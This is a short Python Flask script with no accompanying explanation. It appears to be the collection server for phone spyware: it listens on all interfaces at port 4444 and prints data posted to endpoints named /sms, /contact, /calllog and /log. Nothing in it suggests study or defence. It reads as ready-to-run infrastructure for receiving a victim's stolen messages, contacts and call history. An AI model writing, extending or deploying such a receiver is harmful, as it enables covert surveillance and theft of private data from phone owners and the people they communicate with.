from flask import Flask, request
app = Flask(__name__)

@app.route('/log', methods=['POST'])
@app.route('/sms', methods=['POST'])
@app.route('/contact', methods=['POST'])
@app.route('/calllog', methods=['POST'])
def receive():
    print(f"[{request.path}] {request.form.get('data')}")
    return 'OK'

app.run(host='0.0.0.0', port=4444)
